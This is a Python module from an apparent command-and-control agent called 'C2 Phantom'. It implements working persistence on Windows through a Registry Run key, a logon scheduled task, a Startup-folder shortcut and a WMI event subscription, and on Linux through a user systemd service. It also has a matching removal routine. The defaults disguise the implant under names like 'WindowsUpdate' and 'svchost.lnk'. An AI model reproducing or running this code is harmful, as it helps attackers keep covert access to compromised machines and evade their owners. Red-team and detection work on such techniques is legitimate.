"""
Persistence mechanisms for C2 Phantom agent.

Implements various techniques to maintain access across reboots.
"""

import platform
import subprocess
import os
from pathlib import Path
from typing import Optional, Dict, Any
import logging


logger = logging.getLogger(__name__)


class PersistenceManager:
    """
    Manages persistence mechanisms for the agent.

    Supports multiple persistence techniques across different platforms.
    """

    def __init__(self, agent_path: str, agent_args: Optional[str] = None) -> None:
        """
        Initialize persistence manager.

        Args:
            agent_path: Path to agent executable/script
            agent_args: Optional arguments to pass to agent
        """
        self.agent_path = agent_path
        self.agent_args = agent_args or ""
        self.os_type = platform.system()

    def install_registry_run(self, name: str = "WindowsUpdate") -> Dict[str, Any]:
        """
        Install persistence via Windows Registry Run key.

        Args:
            name: Registry value name

        Returns:
            Installation result
        """
        if self.os_type != "Windows":
            return {"status": "error", "message": "Windows only"}

        try:
            # HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
            command = f"powershell -Command \"New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '{name}' -Value '\\\"{self.agent_path}\\\" {self.agent_args}' -PropertyType String -Force\""

            result = subprocess.run(command, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                logger.info(f"Registry persistence installed: {name}")
                return {"status": "success", "method": "registry_run", "location": f"HKCU\\\\Run\\\\{name}"}
            else:
                return {"status": "error", "message": result.stderr}

        except Exception as e:
            logger.error(f"Registry persistence failed: {e}")
            return {"status": "error", "message": str(e)}

    def install_scheduled_task(self, name: str = "WindowsUpdateCheck") -> Dict[str, Any]:
        """
        Install persistence via Windows Scheduled Task.

        Args:
            name: Task name

        Returns:
            Installation result
        """
        if self.os_type != "Windows":
            return {"status": "error", "message": "Windows only"}

        try:
            # Create scheduled task that runs at logon
            command = f"""schtasks /create /tn "{name}" /tr "\\"{self.agent_path}\\" {self.agent_args}" /sc onlogon /rl highest /f"""

            result = subprocess.run(command, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                logger.info(f"Scheduled task persistence installed: {name}")
                return {"status": "success", "method": "scheduled_task", "name": name}
            else:
                return {"status": "error", "message": result.stderr}

        except Exception as e:
            logger.error(f"Scheduled task persistence failed: {e}")
            return {"status": "error", "message": str(e)}

    def install_startup_folder(self, name: str = "svchost.lnk") -> Dict[str, Any]:
        """
        Install persistence via Windows Startup folder.

        Args:
            name: Shortcut name

        Returns:
            Installation result
        """
        if self.os_type != "Windows":
            return {"status": "error", "message": "Windows only"}

        try:
            # Get startup folder path
            startup_folder = (
                Path(os.environ["APPDATA"]) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
            )
            shortcut_path = startup_folder / name

            # Create shortcut using PowerShell
            ps_script = f"""
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("{shortcut_path}")
$Shortcut.TargetPath = "{self.agent_path}"
$Shortcut.Arguments = "{self.agent_args}"
$Shortcut.Save()
"""

            result = subprocess.run(["powershell", "-Command", ps_script], capture_output=True, text=True)

            if result.returncode == 0 and shortcut_path.exists():
                logger.info(f"Startup folder persistence installed: {shortcut_path}")
                return {"status": "success", "method": "startup_folder", "path": str(shortcut_path)}
            else:
                return {"status": "error", "message": result.stderr}

        except Exception as e:
            logger.error(f"Startup folder persistence failed: {e}")
            return {"status": "error", "message": str(e)}

    def install_wmi_event(self, name: str = "SystemMonitor") -> Dict[str, Any]:
        """
        Install persistence via WMI Event Subscription.

        Args:
            name: Event filter name

        Returns:
            Installation result
        """
        if self.os_type != "Windows":
            return {"status": "error", "message": "Windows only"}

        try:
            # WMI Event Subscription for logon events
            ps_script = f"""
$Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{
    Name = "{name}Filter"
    EventNameSpace = "root\\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LogonSession'"
}} -ErrorAction Stop

$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
    Name = "{name}Consumer"
    CommandLineTemplate = "\\"{self.agent_path}\\" {self.agent_args}"
}} -ErrorAction Stop

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
    Filter = $Filter
    Consumer = $Consumer
}} -ErrorAction Stop
"""

            result = subprocess.run(["powershell", "-Command", ps_script], capture_output=True, text=True)

            if result.returncode == 0:
                logger.info(f"WMI persistence installed: {name}")
                return {"status": "success", "method": "wmi_event", "name": name}
            else:
                return {"status": "error", "message": result.stderr}

        except Exception as e:
            logger.error(f"WMI persistence failed: {e}")
            return {"status": "error", "message": str(e)}

    def install_linux_systemd(self, name: str = "system-monitor") -> Dict[str, Any]:
        """
        Install persistence via Linux systemd service.

        Args:
            name: Service name

        Returns:
            Installation result
        """
        if self.os_type != "Linux":
            return {"status": "error", "message": "Linux only"}

        try:
            service_content = f"""[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=simple
ExecStart={self.agent_path} {self.agent_args}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""

            service_path = Path.home() / ".config" / "systemd" / "user" / f"{name}.service"
            service_path.parent.mkdir(parents=True, exist_ok=True)

            service_path.write_text(service_content)

            # Enable and start service
            subprocess.run(["systemctl", "--user", "enable", f"{name}.service"], check=True)
            subprocess.run(["systemctl", "--user", "start", f"{name}.service"], check=True)

            logger.info(f"Systemd persistence installed: {name}")
            return {"status": "success", "method": "systemd", "service": name, "path": str(service_path)}

        except Exception as e:
            logger.error(f"Systemd persistence failed: {e}")
            return {"status": "error", "message": str(e)}

    def remove_persistence(self, method: str, name: str) -> Dict[str, Any]:
        """
        Remove persistence mechanism.

        Args:
            method: Persistence method to remove
            name: Name/identifier of persistence

        Returns:
            Removal result
        """
        try:
            if method == "registry_run" and self.os_type == "Windows":
                command = f"powershell -Command \"Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '{name}' -Force\""
                subprocess.run(command, shell=True, check=True)

            elif method == "scheduled_task" and self.os_type == "Windows":
                subprocess.run(f'schtasks /delete /tn "{name}" /f', shell=True, check=True)

            elif method == "wmi_event" and self.os_type == "Windows":
                ps_script = f"""
Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter "Name='{name}Filter'" | Remove-WmiObject
Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter "Name='{name}Consumer'" | Remove-WmiObject
Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding | Where-Object {{ $_.Filter -match '{name}' }} | Remove-WmiObject
"""
                subprocess.run(["powershell", "-Command", ps_script], check=True)

            elif method == "systemd" and self.os_type == "Linux":
                subprocess.run(["systemctl", "--user", "stop", f"{name}.service"], check=True)
                subprocess.run(["systemctl", "--user", "disable", f"{name}.service"], check=True)

            logger.info(f"Persistence removed: {method} - {name}")
            return {"status": "success", "method": method, "name": name}

        except Exception as e:
            logger.error(f"Failed to remove persistence: {e}")
            return {"status": "error", "message": str(e)}
